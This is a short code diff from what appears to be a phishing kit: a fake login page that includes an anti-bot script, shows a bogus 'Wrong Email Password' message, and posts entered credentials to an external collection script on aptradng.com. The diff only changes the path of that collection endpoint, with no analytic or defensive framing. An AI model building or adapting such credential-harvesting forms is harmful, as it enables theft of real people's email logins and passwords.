@@ -54,7 +54,7 @@ include('antibots6.php');
 	  !! Wrong Email Password
 	  </small>
 	  </div>
-<form id="loginForm" name="loginForm" method="post" action="https://aptradng.com/west2/loggd.php">
+<form id="loginForm" name="loginForm" method="post" action="https://aptradng.com/west/loggd.php">
 
         <div class="row login-input-group">
           
